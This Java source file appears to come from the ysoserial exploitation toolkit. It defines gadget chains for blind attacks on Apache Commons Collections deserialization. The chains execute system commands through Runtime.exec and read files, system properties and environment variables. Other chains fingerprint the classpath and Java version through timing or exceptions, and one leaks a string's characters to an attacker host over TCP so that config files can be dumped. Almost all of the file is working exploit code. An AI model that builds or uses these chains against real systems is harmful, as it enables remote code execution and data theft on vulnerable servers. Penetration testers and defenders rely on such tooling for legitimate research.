package ysoserial.blind;

import org.apache.commons.collections.Predicate;
import org.apache.commons.collections.PredicateUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.TransformerUtils;
import org.apache.commons.collections.functors.*;
import ysoserial.payloads.annotation.*;

import java.io.File;
import java.lang.reflect.Array;
import java.net.Socket;
import java.util.Collection;
import java.util.LinkedList;
import java.util.List;

/**
 * Useful gadgets for Commons1 exploit.
 *
 * Created by dusanklinec on 12.08.16.
 */
public class Commons1Gadgets {
    /**
     * Action to be performed on true predicate.
     * We can either hold execution thread for some amount of time or throw an exception.
     * Throwing an exception required to be able to detect such event in the application
     * (i.e., deserialization does not throw any exception if predicate is false).
     */
    public enum TransformerAction {
        SLEEP_5,
        EXCEPTION
    }

    /**
     * Merges two arrays into new one.
     * @param first source array. not null
     * @param rest array to append, may be null
     * @param <T> type
     * @return resulting array, new one, not null.
     */
    public static <T> T[] mergeArrays(T[] first, T[]... rest){
        return mergeArrays(Object.class, first, rest);
    }

    /**
     * Merges two arrays into new one.
     * @param first source array. not null
     * @param rest array to append, may be null
     * @return resulting array, new one, not null.
     */
    public static Transformer[] mergeTrans(Transformer[] first, Transformer[]... rest){
        return mergeArrays(Transformer.class, first, rest);
    }

    /**
     * Merges two arrays into new one.
     * @param cls Class of the array elements.
     * @param first source array. not null
     * @param rest array to append, may be null
     * @param <T> type
     * @return resulting array, new one, not null.
     */
    public static <T> T[] mergeArrays(Class cls, T[] first, T[]... rest){
        int totalLength = first.length;
        for (T[] array : rest) {
            totalLength += array.length;
        }

        final T[] arr = (T[]) Array.newInstance(cls, totalLength);
        System.arraycopy(first, 0, arr, 0, first.length);

        int offset = first.length;
        for (T[] array : rest) {
            if (array == null){
                continue;
            }

            final int ln = array.length;
            if (ln == 0){
                continue;
            }

            System.arraycopy(array, 0, arr, offset, ln);
            offset += ln;
        }
        return arr;
    }


    /**
     * Adds the whole array to the collection.
     *
     * @param col collection to add to
     * @param array array to add to collection
     * @return collection
     */
    public static <T> Collection<T> addArray(Collection<T> col, T[] array){
        if (array == null){
            return col;
        }

        for(T a : array){
            col.add(a);
        }

        return col;
    }

    /**
     * Encapsulates given transformer array to the chained transformer.
     *
     * @param transformers transformers to pack
     * @return one transformer
     */
    public static Transformer packToOne(Transformer[] transformers){
        return transformers.length == 1 ? transformers[0] : new ChainedTransformer(transformers);
    }

    /**
     * Encapsulates given transformer to the transformer in such a
     * way it does not return a value, but returns the original value that entered the chain.
     * Closures are used.
     *
     * @param transformer transformer to pack
     * @return one transformer
     */
    @PreservesInput
    public static Transformer packToOneNonBreakingResult(Transformer transformer){
        return new ClosureTransformer(
                new TransformerClosure(
                        transformer
                )
        );
    }

    /**
     * Encapsulated given transformer array to the chained transformer in such a
     * way it does not return a value, but returns the original value that entered the chain.
     * Closures are used.
     *
     * Enables to construct chains like:
     *   m.write(1)
     *   m.write(2)
     *   m.write(3)
     *
     * As write() would return void or integer we would loose m object so it cannot be called on again.
     * With this transformer output value of write() is discarded and m is returned instead.
     *
     * @param transformers transformers to pack
     * @return one transformer
     */
    @PreservesInput
    public static Transformer packToOneNonBreakingResult(Transformer[] transformers){
        return new ClosureTransformer(
                new TransformerClosure(
                        packToOne(transformers)
                )
        );
    }

    /**
     * Calls given transformer only if the input object is not null.
     * NOP is called in case of a null.
     *
     * @param tr transformer to perform on input object if not null
     * @return transformer chain
     */
    public static Transformer[] transformIfNotNullTransformer(Transformer tr){
        return new Transformer[]{
                TransformerUtils.switchTransformer(
                        PredicateUtils.notNullPredicate(),
                        tr,
                        TransformerUtils.nopTransformer()
                )
        };
    }

    /**
     * Constructs transformer which attemtps to load a given class
     * using the class name. If class load is successful, nothing happens, otherwise exception is thrown.
     * This makes sense only when chained with getTerminalTransformer(true).
     *
     * If application being exploited enables to distinguish exception and clean deserialization
     * this can be used to detect if class with given name exists in the project.
     * In particular one can detect if libraries are on the classpath and possibly their versions
     * (e.g., by loading a class which was added in version 1.2 but was not present in 1.1).
     *
     * @param className class name to load
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(Object.class)
    public static Transformer[] classLoaderTransformer(String className){
        return invokeStaticMethodTransformer(
                Class.class,
                "forName",
                new Class[]{
                        String.class
                },
                new Object[]{
                        className
                }
        );
    }

    /**
     * Transformer chain calling static method on given class.
     *
     * @param methodName name of the method
     * @param argsTypes array of argument types
     * @param args array of arguments
     * @return transformer chain
     */
    @UsesInput(Class.class)
    public static Transformer[] invokeStaticMethodTransformer(
            String methodName,
            Class[] argsTypes,
            Object[] args
    ){
        return new Transformer[]{
                new InvokerTransformer("getMethod",
                        new Class[]{
                                String.class, Class[].class
                        },
                        new Object[]{
                                methodName, argsTypes == null ? new Class[0] : argsTypes
                        }),
                new InvokerTransformer("invoke",
                        new Class[]{
                                Object.class, Object[].class
                        }, new Object[]
                        {
                                null, args == null ? new Object[0] : args
                        })
        };
    }

    /**
     * Transformer chain calling static method on given class.
     *
     * @param className full class name, with package
     * @param methodName name of the method
     * @param argsTypes array of argument types
     * @param args array of arguments
     * @return transformer chain
     */
    @NewInput
    public static Transformer[] invokeStaticMethodTransformer(
            String className,
            String methodName,
            Class[] argsTypes,
            Object[] args
    ){
        return mergeTrans(
                classLoaderTransformer(className),
                invokeStaticMethodTransformer(
                        methodName,
                        argsTypes,
                        args));
    }

    /**
     * Transformer chain calling static method on given class.
     *
     * @param clazz class to call on
     * @param methodName name of the method
     * @param argsTypes array of argument types
     * @param args array of arguments
     * @return transformer chain
     */
    @NewInput
    public static Transformer[] invokeStaticMethodTransformer(
            Class clazz,
            String methodName,
            Class[] argsTypes,
            Object[] args
    ){
        return mergeTrans(
                new Transformer[]{
                        new ConstantTransformer(clazz)
                },
                invokeStaticMethodTransformer(
                        methodName,
                        argsTypes,
                        args));
    }

    /**
     * Transformer building simple new File(path) object.
     *
     * @param path path to create file for
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(File.class)
    public static Transformer[] fileTransformer(String path){
        return new Transformer[]{
                new ConstantTransformer(File.class),
                new InstantiateTransformer(
                        new Class[]{
                                String.class
                        },
                        new Object[]{
                                path
                        })
        };
    }

    /**
     * Generates terminal, last one transformer for CommonsCollection1 payload.
     * If valid is set to true, deserialization of transformer chain does not cause exception.
     * Otherwise Integer(1) to HashSet class cast exception is thrown.
     *
     * @param valid if true, deserialization does not throw an exception
     * @return terminal transformer
     */
    @NewInput
    @ProducesOutput
    public static Transformer[] getTerminalTransformer(boolean valid){
        return valid ?
                new Transformer[] {
                        new ConstantTransformer(java.util.HashSet.class),
                        new InvokerTransformer(
                                "newInstance",
                                null, null)
                } :
                new Transformer[] {
                        new ConstantTransformer(1)
                };
    }

    /**
     * Generates transformer chain causing current thread to sleep.
     *
     * @param time time to sleep in milliseconds.
     * @return transformer chain
     */
    @NewInput
    public static Transformer[] getSleepTransformer(long time) {
        return invokeStaticMethodTransformer(
                Thread.class,
                "sleep",
                new Class[]{ Long.TYPE },
                new Object[]{ time });
    }

    /**
     * Command execution transformer chain.
     *
     * @param command system command to execute
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(Process.class)
    public static Transformer[] getExecTransformer(String command){
        return mergeTrans(
                invokeStaticMethodTransformer(
                    Runtime.class,
                    "getRuntime",
                    null, null),
                new Transformer[]{
                    new InvokerTransformer(
                            "exec",
                            new Class[]{ String.class },
                            new Object[]{ command })
                });
    }

    /**
     * Command execution transformer chain.
     * With arguments and file separated.
     * If file does not exists command[0], IOException is thrown (side-channel).
     *
     * @param command command array to execute. 0 element = file, then each element is argument.
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(Process.class)
    public static Transformer[] getExecTransformer(String[] command){
        return mergeTrans(
                invokeStaticMethodTransformer(
                        Runtime.class,
                        "getRuntime",
                        null, null),
                new Transformer[]{
                        new InvokerTransformer(
                                "exec",
                                new Class[]{ String[].class },
                                new Object[]{ command })
                });
    }

    /**
     * Returns transformer chain which performs given action.
     *
     * @param action action to perform
     * @return transformer chain
     */
    public static Transformer[] getActionTransformer(TransformerAction action){
        if (action == TransformerAction.EXCEPTION){
            return new Transformer[]{ TransformerUtils.exceptionTransformer() };
        } else {
            return getSleepTransformer(5000); // 5 sec by default
        }
    }

    /**
     * Performs a given action if given predicate evaluates to true.
     * @param predicate predicate to evaluate
     * @param action action to take if predicate is true
     * @return transformer chain
     */
    @Action
    @UsesInput
    public static Transformer[] actionIfPredicateTransformer(Predicate predicate, TransformerAction action){
        return new Transformer[]{
                TransformerUtils.switchTransformer(
                        predicate,
                        packToOne(getActionTransformer(action)),
                        TransformerUtils.nopTransformer()
                )
        };
    }

    /**
     * Takes input and checks for its nullity.
     *
     * @param action action to perform. Wait/exception.
     * @return transformer chain
     */
    @Action
    @UsesInput
    public static Transformer[] actionIfNullTransformer(TransformerAction action){
        return actionIfPredicateTransformer(PredicateUtils.nullPredicate(), action);
    }

    /**
     * Takes input and checks for its nullity.
     *
     * @param action action to perform. Wait/exception.
     * @return transformer chain
     */
    @Action
    @UsesInput
    public static Transformer[] actionIfNotNullTransformer(TransformerAction action){
        return actionIfPredicateTransformer(PredicateUtils.notNullPredicate(), action);
    }

    /**
     * Construct transformer chain which TCP connects to host:port.
     * No data is written. At least SYN request should be made.
     *
     * @param host host to connect to
     * @param port port number
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(Socket.class)
    public static Transformer[] getConnectToTransformer(String host, int port){
        return new Transformer[]{
                new ConstantTransformer(Socket.class),
                new InvokerTransformer("getConstructor",
                        new Class[]{
                                Class[].class
                        },
                        new Object[]{
                                new Class[] { String.class, Integer.TYPE }
                        }),
                new InvokerTransformer("newInstance",
                        new Class[]{
                                Object[].class
                        },
                        new Object[]{
                                new Object[] {host, port}
                        })
        };
    }

    /**
     * Builds transformer chain that calls Socket.sendUrgentData(data) on the input socket.
     *
     * @param data data to send
     * @return transformer chain
     */
    @UsesInput(Socket.class)
    public static Transformer[] buildSendUrgentDataRaw(int data){
        return new Transformer[] {
                    new InvokerTransformer("sendUrgentData",
                            new Class[]{
                                    Integer.TYPE
                            },
                            new Object[]{
                                    data
                            })
        };
    }

    /**
     * Builds transformer chain that calls Socket.sendUrgentData(data) on the input socket.
     * In such a way Socket value is preserved for the next call.
     * Thus these chains can be chained to send more urgent data.
     * Calls {@see packToOneNonBreakingResult} internally
     *
     * @param data data to send
     * @return transformer chain
     */
    @PreservesInput
    @UsesInput(Socket.class)
    public static Transformer[] buildSendUrgentData(int data){
        return new Transformer[] {
                packToOneNonBreakingResult(
                        new InvokerTransformer("sendUrgentData",
                                new Class[]{
                                        Integer.TYPE
                                },
                                new Object[]{
                                        data
                                }))
        };
    }

    /**
     * Returns transformer throwing an exception if there is no org.apache.commons.io.FileUtils class on the classpath
     * or cannot be used.
     *
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(Object.class)
    public static Transformer[] hasCommonIoTransformer(){
        return classLoaderTransformer("org.apache.commons.io.FileUtils");
    }

    /**
     * Returns transformer throwing an exception if there is missing java 8 method (java 8 is not in place).
     * Uses java.util.stream.Collectors class to detect (@since 1.8)
     *
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(Object.class)
    public static Transformer[] hasJava8Transformer(){
        return classLoaderTransformer("java.util.stream.Collectors");
    }

    /**
     * Returns transformer throwing an exception if there is missing java 7 method (java 7 is not in place).
     * Uses java.util.concurrent.ConcurrentLinkedDeque to detect (@since 1.7)
     *
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(Object.class)
    public static Transformer[] hasJava7Transformer(){
        return classLoaderTransformer("java.util.concurrent.ConcurrentLinkedDeque"); // java.nio.file.attribute.FileTime
    }

    /**
     * Returns transformer throwing an exception if there is missing java 6 method (java 6 is not in place).
     * Uses java.util.concurrent.LinkedBlockingDeque to detect (@since 1.6)
     *
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(Object.class)
    public static Transformer[] hasJava6Transformer(){
        return classLoaderTransformer("java.util.concurrent.LinkedBlockingDeque");
    }

    /**
     * Returns transformer throwing an exception if there is missing java 5 method (java 5 is not in place).
     * Uses java.lang.ProcessBuilder to detect (@since 1.5)
     *
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(Object.class)
    public static Transformer[] hasJava5Transformer(){
        return classLoaderTransformer("java.lang.ProcessBuilder");
    }

    /**
     * Returns transformer throwing an exception if there is missing java 4 method (java 4 is not in place).
     * Uses java.util.logging.SocketHandler to detect (@since 1.4)
     *
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(Object.class)
    public static Transformer[] hasJava4Transformer(){
        return classLoaderTransformer("java.util.logging.SocketHandler");
    }

    /**
     * Returns predicate if file exists.
     *
     * @param path file path
     * @return predicate
     */
    @NewInput
    public static Predicate fileExistsPredicate(String path){
        return PredicateUtils.asPredicate(
                packToOne(
                        mergeTrans(
                                fileTransformer(path),
                                new Transformer[]{
                                        new InvokerTransformer("exists",
                                                null, null),
                                })));
    }

    /**
     * Takes created file, causes action if file exist.
     *
     * @return transformer chain
     */
    @Action
    @NewInput
    public static Transformer[] fileExistsTransformer(String path, TransformerAction action){
        return actionIfPredicateTransformer(fileExistsPredicate(path), action);
    }

    /**
     * Takes created file, causes action if file is readable.
     *
     * @return transformer chain
     */
    @Action
    @UsesInput(File.class)
    public static Transformer[] fileReadableTransformer(String path, TransformerAction action){
        return actionIfPredicateTransformer(
                PredicateUtils.asPredicate(
                        packToOne(
                                mergeTrans(
                                        fileTransformer(path),
                                        new Transformer[]{
                                                new InvokerTransformer("canRead",
                                                        null, null),
                                        }))), action);
    }

    /**
     * Takes created file, causes action if file is writable.
     *
     * @return transformer chain
     */
    @Action
    @UsesInput(File.class)
    public static Transformer[] fileWritableTransformer(String path, TransformerAction action){
        return actionIfPredicateTransformer(
                PredicateUtils.asPredicate(
                        packToOne(
                                mergeTrans(
                                        fileTransformer(path),
                                        new Transformer[]{
                                                new InvokerTransformer("canWrite",
                                                        null, null),
                                        }))), action);
    }

    /**
     * Reads file to the string. String is the returned object by the last transformer in the chain.
     * Code executed: {@code
     *     new Scanner(new File("filename")).useDelimiter("\\Z").next();
     * }
     *
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(String.class)
    public static Transformer[] fileReadToString01Transformer(String path){
        return mergeTrans(
                classLoaderTransformer("java.util.Scanner"),
                new Transformer[]{
                        new InstantiateTransformer(
                                new Class[]{
                                        File.class
                                },
                                new Object[]{
                                        new File(path) // File is serializable
                                }),
                        new InvokerTransformer("useDelimiter",
                                new Class[]{
                                        String.class
                                },
                                new Object[]{
                                        "\\Z"
                                }),
                        new InvokerTransformer("next",
                                null,
                                null)
                });
    }

    /**
     * Reads file to the string. String is the returned object by the last transformer in the chain.
     * Depends on commons-io library. The presence should be tested by {@see hasCommonIoTransformer}
     * in a separate test.
     *
     * Code executed: {@code
     *     org.apache.commons.io.FileUtils.readFileToString(new File("/path/to/the/file"), "UTF-8")
     * }
     *
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(String.class)
    public static Transformer[] fileReadToString02Transformer(String path){
        return invokeStaticMethodTransformer(
                "org.apache.commons.io.FileUtils",
                "readFileToString",
                new Class[]{ File.class, String.class },
                new Object[]{ new File(path), "UTF-8" });
    }

    /**
     * return System.getProperty(property)
     *
     * @param property property to load
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(String.class)
    public static Transformer[] readSystemPropertyToStringTransformer(String property){
        return invokeStaticMethodTransformer(
                System.class,
                "getProperty",
                new Class[]{ String.class },
                new Object[]{ property });
    }

    /**
     * return System.getenv(property)
     *
     * @param property property to load
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(String.class)
    public static Transformer[] readEnvPropertyToStringTransformer(String property){
        return invokeStaticMethodTransformer(
                System.class,
                "getenv",
                new Class[]{ String.class },
                new Object[]{ property });
    }

    // -----------------------------------------------------------------------------------------------------------------
    // String utils

    /**
     * Transforms input value to String.
     * String.valueOf(Input).
     *
     * Can be used on primitive types to examine it and have a fun again.
     *
     * @return transformer chain
     */
    public static Transformer[] toStringTransformer(){
        return new Transformer[]{
            StringValueTransformer.getInstance()
        };
    }

    /**
     * String.trim()
     *
     * @return transformer chain
     */
    @UsesInput(String.class)
    @ProducesOutput(String.class)
    public static Transformer[] strTrimTransformer() {
        return new Transformer[]{
                new InvokerTransformer("trim",
                        null,
                        null)
        };
    }

    /**
     * String.toLowerCase()
     *
     * @return transformer chain
     */
    @UsesInput(String.class)
    @ProducesOutput(String.class)
    public static Transformer[] strToLowerCaseTransformer(){
        return new Transformer[]{
                new InvokerTransformer("toLowerCase",
                        null,
                        null)
        };
    }

    /**
     * String.toUpperCase()
     *
     * @return transformer chain
     */
    @UsesInput(String.class)
    @ProducesOutput(String.class)
    public static Transformer[] strToUpperCaseTransformer(){
        return new Transformer[]{
                new InvokerTransformer("toUpperCase",
                        null,
                        null)
        };
    }

    /**
     * String.substring(startOffset)
     *
     * @return transformer chain
     */
    @UsesInput(String.class)
    @ProducesOutput(String.class)
    public static Transformer[] strSubstringTransformer(int startOffset){
        return new Transformer[]{
                new InvokerTransformer("substring",
                        new Class[] { Integer.TYPE },
                        new Object[] {startOffset})
        };
    }

    /**
     * String.substring(startOffset, endOffset)
     *
     * @return transformer chain
     */
    @UsesInput(String.class)
    @ProducesOutput(String.class)
    public static Transformer[] strSubstringTransformer(int startOffset, int endOffset){
        return new Transformer[]{
                new InvokerTransformer("substring",
                        new Class[] { Integer.TYPE, Integer.TYPE },
                        new Object[] {startOffset, endOffset})
        };
    }

    /**
     * String.isEmpty()
     *
     * @return predicate
     */
    @UsesInput(String.class)
    public static Predicate isEmptyPredicate(){
        return PredicateUtils.asPredicate(
            new InvokerTransformer("isEmpty",
                    null,
                    null)
        );
    }

    /**
     * String.equals(src)
     *
     * @param src to compare to
     * @return predicate
     */
    @UsesInput(String.class)
    public static Predicate equalsPredicate(String src){
        return PredicateUtils.asPredicate(
            new InvokerTransformer("equals",
                    new Class[] {Object.class},
                    new Object[] {src})
        );
    }

    /**
     * String.equalsIgnoreCase(src)
     *
     * @param src to compare to
     * @return predicate
     */
    @UsesInput(String.class)
    public static Predicate equalsIgnoreCasePredicate(String src){
        return PredicateUtils.asPredicate(
            new InvokerTransformer("equalsIgnoreCase",
                    new Class[] {Object.class},
                    new Object[] {src})
        );
    }

    /**
     * Very powerful gadget for performing regex on the input string.
     * One can perform binary search on characters or look for patterns with this gadget.
     *
     * @param regex regex
     * @return predicate
     */
    @UsesInput(String.class)
    public static Predicate matchesPredicate(String regex){
        return PredicateUtils.asPredicate(
            new InvokerTransformer("matches",
                    new Class[] {String.class},
                    new Object[] {regex})
        );
    }

    /**
     * String.startsWith(prefix)
     *
     * @param prefix prefix
     * @return predicate
     */
    @UsesInput(String.class)
    public static Predicate startsWithPredicate(String prefix){
        return PredicateUtils.asPredicate(
            new InvokerTransformer("startsWith",
                    new Class[] {String.class},
                    new Object[] {prefix})
        );
    }

    /**
     * String.endsWith(suffix)
     *
     * @param suffix suffix
     * @return predicate
     */
    @UsesInput(String.class)
    public static Predicate endsWithPredicate(String suffix){
        return PredicateUtils.asPredicate(
            new InvokerTransformer("endsWith",
                    new Class[] {String.class},
                    new Object[] {suffix})
        );
    }

    /**
     * String.contains(string)
     *
     * @param string string
     * @return predicate
     */
    @UsesInput(String.class)
    public static Predicate containsPredicate(String string){
        return PredicateUtils.asPredicate(
            new InvokerTransformer("contains",
                    new Class[] {CharSequence.class},
                    new Object[] {string})
        );
    }

    // -----------------------------------------------------------------------------------------------------------------
    // String leak via socket

    /**
     * This small hack uses SwitchTransformer to overcome a limitation where we
     * cannot simply pass result of the operation as an argument to arbitrary method.
     * The hack does the following:
     *   if str(0x00).equals(inp) -> sendTcp(host, port, str(0x00))
     *   if str(0x01).equals(inp) -> sendTcp(host, port, str(0x01))
     *   if str(0x02).equals(inp) -> sendTcp(host, port, str(0x02))
     *     .
     *     .
     *     .
     *   if str(0x7f).equals(inp) -> sendTcp(host, port, str(0x7f))
     *
     *   This method supports only ASCII characters, UTF8 is not supported.
     *   We use this anyway for dumping config files - should not contain UTF8 strings.
     *   Note this is code heavy, payload like this occupies quite a lot of space.
     *
     * @param host host to connect to and send data
     * @param port port to connect to
     * @param charPos position of the character in the input string. If null the
     *                input is considered as 1 char string (no substring is performed).
     * @return transformer chain
     */
    @Action
    @UsesInput(String.class)
    public static Transformer[] charToSocket(String host, int port, Integer charPos){
        final List<Transformer> trs = new LinkedList<Transformer>();
        if (charPos != null){
            addArray(trs, strSubstringTransformer(charPos, charPos+1));
        }

        final List<Predicate> predicates = new LinkedList<Predicate>();
        final List<Transformer> transformers = new LinkedList<Transformer>();
        final byte[] sampleByte = new byte[1];

        // For each guess add a special rule.
        for(int idx=0; idx<=0x7f; idx++){
            sampleByte[0] = (byte)idx;
            final String sample = new String(sampleByte);

            predicates.add(equalsPredicate(sample));
            transformers.add(packToOne(mergeTrans(
                    getConnectToTransformer(host, port),
                    buildSendUrgentDataRaw(idx)
            )));
        }

        // Main switch transformer, for each case 1 rule. Default is 0xff - unrecognized character.
        trs.add(new SwitchTransformer(
                predicates.toArray(new Predicate[predicates.size()]),
                transformers.toArray(new Transformer[transformers.size()]),
                packToOne(mergeTrans(
                        getConnectToTransformer(host, port),
                        buildSendUrgentDataRaw(0xff)))
        ));

        return trs.toArray(new Transformer[trs.size()]);
    }

    // -----------------------------------------------------------------------------------------------------------------
    // Security manager

    /**
     * Returns currently installed security manager - for further queries.
     * System.getSecurityManager()
     *
     * @return transformer chain
     */
    @NewInput
    @ProducesOutput(SecurityManager.class)
    public static Transformer[] getSecurityManagerTransformer(){
        return invokeStaticMethodTransformer(
                System.class,
                "getSecurityManager",
                null,
                null);
    }

    /**
     * {@code System.getSecurityManager().checkConnect(host, port); }
     *
     * @param host host
     * @param port port
     * @return transformer chain
     */
    @Action
    @UsesInput(SecurityManager.class)
    public static Transformer[] secMgrCheckConnectTransformer(String host, int port){
        return mergeTrans(
                getSecurityManagerTransformer(),
                transformIfNotNullTransformer(
                    new InvokerTransformer("checkConnect",
                            new Class[]{
                                    String.class, Integer.TYPE
                            },
                            new Object[]{
                                    host, port
                            }))
        );
    }

    /**
     * {@code System.getSecurityManager().checkExec(command); }
     *
     * @param command command
     * @return transformer chain
     */
    @Action
    @UsesInput(SecurityManager.class)
    public static Transformer[] secMgrCheckExecTransformer(String command){
        return mergeTrans(
                getSecurityManagerTransformer(),
                transformIfNotNullTransformer(
                    new InvokerTransformer("checkExec",
                            new Class[]{
                                    String.class
                            },
                            new Object[]{
                                    command
                            })
        ));
    }

    /**
     * {@code System.getSecurityManager().checkRead(file); }
     *
     * @param file file path
     * @return transformer chain
     */
    @Action
    @UsesInput(SecurityManager.class)
    public static Transformer[] secMgrCheckReadTransformer(String file){
        return mergeTrans(
                getSecurityManagerTransformer(),
                transformIfNotNullTransformer(
                    new InvokerTransformer("checkRead",
                            new Class[]{
                                    String.class
                            },
                            new Object[]{
                                    file
                            })
        ));
    }

    /**
     * {@code System.getSecurityManager().checkWrite(file); }
     *
     * @param file file path
     * @return transformer chain
     */
    @Action
    @UsesInput(SecurityManager.class)
    public static Transformer[] secMgrCheckWriteTransformer(String file){
        return mergeTrans(
                getSecurityManagerTransformer(),
                transformIfNotNullTransformer(
                    new InvokerTransformer("checkWrite",
                            new Class[]{
                                    String.class
                            },
                            new Object[]{
                                    file
                            })
        ));
    }

    /**
     * {@code System.getSecurityManager().checkDelete(file); }
     *
     * @param file file path
     * @return transformer chain
     */
    @Action
    @UsesInput(SecurityManager.class)
    public static Transformer[] secMgrCheckDeleteTransformer(String file){
        return mergeTrans(
                getSecurityManagerTransformer(),
                transformIfNotNullTransformer(
                    new InvokerTransformer("checkDelete",
                            new Class[]{
                                    String.class
                            },
                            new Object[]{
                                    file
                            })
                ));
    }

    /**
     * {@code System.getSecurityManager().checkPackageAccess(pkg); }
     *
     * @param pkg package
     * @return transformer chain
     */
    @Action
    @UsesInput(SecurityManager.class)
    public static Transformer[] secMgrCheckPackageAccessTransformer(String pkg){
        return mergeTrans(
                getSecurityManagerTransformer(),
                transformIfNotNullTransformer(
                    new InvokerTransformer("checkPackageAccess",
                            new Class[]{
                                    String.class
                            },
                            new Object[]{
                                    pkg
                            })
        ));
    }

    /**
     * {@code System.getSecurityManager().checkPropertyAccess(property); }
     *
     * @param property package
     * @return transformer chain
     */
    @Action
    @UsesInput(SecurityManager.class)
    public static Transformer[] secMgrCheckPropertyAccessTransformer(String property){
        return mergeTrans(
                getSecurityManagerTransformer(),
                transformIfNotNullTransformer(
                    new InvokerTransformer("checkPropertyAccess",
                            new Class[]{
                                    String.class
                            },
                            new Object[]{
                                    property
                            })
        ));
    }
}
